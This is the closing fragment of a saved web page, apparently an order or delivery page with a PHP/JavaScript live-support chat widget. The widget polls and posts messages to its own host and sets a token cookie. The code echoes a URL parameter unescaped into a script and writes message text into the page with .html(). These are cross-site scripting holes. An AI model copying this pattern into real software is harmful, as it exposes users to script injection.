
    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./ord_files/translate_24dp.png" width="20" height="20" alt="Google Переводчик"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Исходный текст</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Предложить лучший вариант перевода</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>


<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>